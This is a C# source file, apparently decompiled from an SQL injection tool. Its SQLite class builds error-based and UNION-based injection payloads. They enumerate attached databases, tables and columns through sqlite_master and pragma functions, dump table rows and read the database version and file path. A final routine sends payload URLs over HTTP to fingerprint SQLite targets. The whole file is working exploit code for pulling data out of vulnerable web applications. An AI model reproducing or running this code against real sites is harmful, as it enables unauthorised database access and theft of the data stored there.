using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase
{
    /// <summary>
    /// SQLite database engine support for SQL injection testing
    /// </summary>
    public class SQLite
    {
        /// <summary>
        /// Generates an information extraction query for SQLite
        /// </summary>
        public static string Info(string sTraject, InjectionType oError, List<string> lColumn, string sEndUrl = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string separator = Class23.smethod_21(Class54.string_2, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            string columnQuery;
            if (lColumn.Count == 1)
            {
                columnQuery = lColumn[0].Trim();
            }
            else
            {
                var columns = new List<string>();
                for (int i = 0; i < lColumn.Count; i++)
                {
                    columns.Add(lColumn[i].Trim());
                }
                columnQuery = string.Join("||" + separator + "||", columns);
            }

            text = text.Replace("%K%", newValue);
            text = text.Replace("[t]", columnQuery);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates a database enumeration query for SQLite
        /// </summary>
        public static string DataBases(string sTraject, InjectionType oError, bool bCurrentDB, int iDbId, 
            int iAffectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            if (bCurrentDB)
            {
                // SQLite doesn't have a database concept like MySQL/MSSQL, return current file
                text = text.Replace("[t]", "'main'");
            }
            else
            {
                // SQLite attached databases
                string query = "SELECT name FROM pragma_database_list";
                if (!string.IsNullOrEmpty(sWhere))
                {
                    query += " WHERE " + sWhere;
                }
                if (!string.IsNullOrEmpty(sOrderBy))
                {
                    query += " ORDER BY " + sOrderBy;
                }
                query += " LIMIT 1 OFFSET " + iDbId;
                
                text = text.Replace("[t]", "(" + query + ")");
            }

            text = text.Replace("%K%", newValue);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates a table enumeration query for SQLite
        /// </summary>
        public static string Tables(string sTraject, string sDataBase, InjectionType oError, int iIndex, 
            int iAffectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            // SQLite system tables query
            string query = "SELECT name FROM sqlite_master WHERE type='table'";
            if (!string.IsNullOrEmpty(sWhere))
            {
                query += " AND " + sWhere;
            }
            if (!string.IsNullOrEmpty(sOrderBy))
            {
                query += " ORDER BY " + sOrderBy;
            }
            else
            {
                query += " ORDER BY name";
            }
            query += " LIMIT 1 OFFSET " + iIndex;

            text = text.Replace("[t]", "(" + query + ")");
            text = text.Replace("%K%", newValue);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates a column enumeration query for SQLite
        /// </summary>
        public static string Columns(string sTraject, string sDataBase, string sTable, InjectionType oError, 
            int iIndex, int iAffectedRows = 0, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            // SQLite column information query
            string query = "SELECT name FROM pragma_table_info('" + sTable + "')";
            if (!string.IsNullOrEmpty(sWhere))
            {
                query += " WHERE " + sWhere;
            }
            if (!string.IsNullOrEmpty(sOrderBy))
            {
                query += " ORDER BY " + sOrderBy;
            }
            else
            {
                query += " ORDER BY cid";
            }
            query += " LIMIT 1 OFFSET " + iIndex;

            text = text.Replace("[t]", "(" + query + ")");
            text = text.Replace("%K%", newValue);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates a data dumping query for SQLite
        /// </summary>
        public static string Dump(string sTraject, string sDataBase, string sTable, List<string> lColumn, 
            bool bIFNULL, InjectionType oError, int iIndex, int iAffectedRows = 0, string sWhere = "", 
            string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string separator = Class23.smethod_21(Class54.string_2, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            string query;
            if (!string.IsNullOrEmpty(sCustomQuery))
            {
                query = sCustomQuery;
            }
            else
            {
                // Build column selection
                string columnSelection;
                if (lColumn.Count == 1)
                {
                    columnSelection = bIFNULL ? 
                        "IFNULL(" + lColumn[0].Trim() + ", ' ')" : 
                        lColumn[0].Trim();
                }
                else
                {
                    var columns = new List<string>();
                    for (int i = 0; i < lColumn.Count; i++)
                    {
                        string col = bIFNULL ? 
                            "IFNULL(" + lColumn[i].Trim() + ", ' ')" : 
                            lColumn[i].Trim();
                        columns.Add(col);
                    }
                    columnSelection = string.Join("||" + separator + "||", columns);
                }

                query = "SELECT " + columnSelection + " FROM " + sTable;
                if (!string.IsNullOrEmpty(sWhere))
                {
                    query += " WHERE " + sWhere;
                }
                if (!string.IsNullOrEmpty(sOrderBy))
                {
                    query += " ORDER BY " + sOrderBy;
                }
                query += " LIMIT 1 OFFSET " + iIndex;
            }

            text = text.Replace("[t]", "(" + query + ")");
            text = text.Replace("%K%", newValue);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates a count query for SQLite
        /// </summary>
        public static string Count(string sTraject, InjectionType oError, Schema o, string sDataBase, 
            string sTable, string sWhere = "", string sEndUrl = "")
        {
            string newValue = Class23.smethod_21(Class54.string_0, false, "||", "char");
            string text = "";

            if (oError == InjectionType.Error)
            {
                text = "CAST((%K%||[t]||%K%) AS INTEGER)";
            }
            else
            {
                text = "(%K%||[t]||%K%)";
            }

            string query = "";
            switch (o)
            {
                case Schema.DATABASES:
                    query = "SELECT COUNT(*) FROM pragma_database_list";
                    if (!string.IsNullOrEmpty(sWhere))
                        query += " WHERE " + sWhere;
                    break;

                case Schema.TABLES:
                    query = "SELECT COUNT(*) FROM sqlite_master WHERE type='table'";
                    if (!string.IsNullOrEmpty(sWhere))
                        query += " AND " + sWhere;
                    break;

                case Schema.COLUMNS:
                    query = "SELECT COUNT(*) FROM pragma_table_info('" + sTable + "')";
                    if (!string.IsNullOrEmpty(sWhere))
                        query += " WHERE " + sWhere;
                    break;

                case Schema.ROWS:
                    query = "SELECT COUNT(*) FROM " + sTable;
                    if (!string.IsNullOrEmpty(sWhere))
                        query += " WHERE " + sWhere;
                    break;
            }

            text = text.Replace("[t]", "(" + query + ")");
            text = text.Replace("%K%", newValue);
            text = Class23.smethod_7(text);
            
            return sTraject.Replace("[t]", text) + sEndUrl;
        }

        /// <summary>
        /// Generates SQLite-specific payloads for various injection types
        /// </summary>
        public static List<string> GetPayloads(InjectionType injectionType, InjectionFormat format)
        {
            var payloads = new List<string>();

            switch (injectionType)
            {
                case InjectionType.Error:
                    if (format == InjectionFormat.String)
                    {
                        payloads.AddRange(new[]
                        {
                            "' AND CAST(([t]) AS INTEGER) AND 'x'='x",
                            "' AND ([t]) = CAST('a' AS INTEGER) AND 'x'='x",
                            "' AND TYPEOF([t]) = 'integer' AND 'x'='x",
                            "' AND ([t]) || 'abc' = 'abc' AND 'x'='x"
                        });
                    }
                    else
                    {
                        payloads.AddRange(new[]
                        {
                            " AND CAST(([t]) AS INTEGER)",
                            " AND ([t]) = CAST('a' AS INTEGER)",
                            " AND TYPEOF([t]) = 'integer'",
                            " AND ([t]) || 'abc' = 'abc'"
                        });
                    }
                    break;

                case InjectionType.Union:
                    if (format == InjectionFormat.String)
                    {
                        payloads.AddRange(new[]
                        {
                            "' UNION SELECT [t] --",
                            "' UNION ALL SELECT [t] --",
                            "' UNION SELECT [t] /*",
                            "' UNION ALL SELECT [t] /*"
                        });
                    }
                    else
                    {
                        payloads.AddRange(new[]
                        {
                            " UNION SELECT [t] --",
                            " UNION ALL SELECT [t] --",
                            " UNION SELECT [t] /*",
                            " UNION ALL SELECT [t] /*"
                        });
                    }
                    break;
            }

            return payloads;
        }

        /// <summary>
        /// Gets SQLite version information
        /// </summary>
        public static string GetVersion(string sTraject, InjectionType oError, string sEndUrl = "")
        {
            var versionColumns = new List<string> { "sqlite_version()" };
            return Info(sTraject, oError, versionColumns, sEndUrl);
        }

        /// <summary>
        /// Gets SQLite database file path
        /// </summary>
        public static string GetDatabasePath(string sTraject, InjectionType oError, string sEndUrl = "")
        {
            var pathColumns = new List<string> { "file" };
            return Info(sTraject, oError, pathColumns, sEndUrl);
        }

        /// <summary>
        /// Tests for SQLite-specific functions
        /// </summary>
        public static bool TestSQLiteFeatures(string sTraject, HTTPExt httpExt)
        {
            var testPayloads = new[]
            {
                "sqlite_version()",
                "pragma_table_info('sqlite_master')",
                "last_insert_rowid()",
                "changes()",
                "total_changes()"
            };

            foreach (var payload in testPayloads)
            {
                try
                {
                    var testColumns = new List<string> { payload };
                    var testUrl = Info(sTraject, InjectionType.Error, testColumns);
                    var response = httpExt.QuickGet(testUrl);
                    
                    if (response != null)
                    {
                        var responseStr = response.ToString();
                        if (responseStr.Contains("SQLite") || responseStr.Contains("sqlite"))
                        {
                            return true;
                        }
                    }
                }
                catch
                {
                    // Continue with next payload
                }
            }

            return false;
        }
    }
}